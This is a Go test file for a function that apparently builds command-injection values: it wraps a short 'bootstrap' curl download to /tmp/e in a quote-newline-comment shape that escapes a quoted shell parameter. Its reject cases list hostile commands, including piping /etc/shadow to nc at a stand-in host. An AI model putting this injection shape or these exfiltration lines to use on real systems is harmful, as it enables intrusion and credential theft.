package channel

import (
	"strings"
	"testing"
)

func TestParameterValue(t *testing.T) {
	// The bootstrap command shape: curl + address + redirect.
	cmd := "curl 192.0.2.100>/tmp/e"
	if len(cmd) != 23 {
		t.Fatalf("test command is %d bytes, expected 23", len(cmd))
	}
	v, err := ParameterValue(cmd)
	if err != nil {
		t.Fatal(err)
	}
	if v != "'\n"+cmd+"\n#" {
		t.Fatalf("unexpected value %q", v)
	}
	if len(v) > 32 {
		t.Fatalf("value is %d bytes", len(v))
	}
}

func TestParameterValueRejects(t *testing.T) {
	cases := []struct{ name, cmd string }{
		{"too long", strings.Repeat("a", MaxCommand+1)},
		{"semicolon", "id; reboot"},
		{"pipe", "cat /etc/shadow|nc 1.2.3.4 9"},
		{"ampersand", "sleep 1&"},
		{"backtick", "echo `id`"},
		{"empty", "   "},
	}
	for _, c := range cases {
		if _, err := ParameterValue(c.cmd); err == nil {
			t.Errorf("%s: expected error for %q", c.name, c.cmd)
		}
	}
}
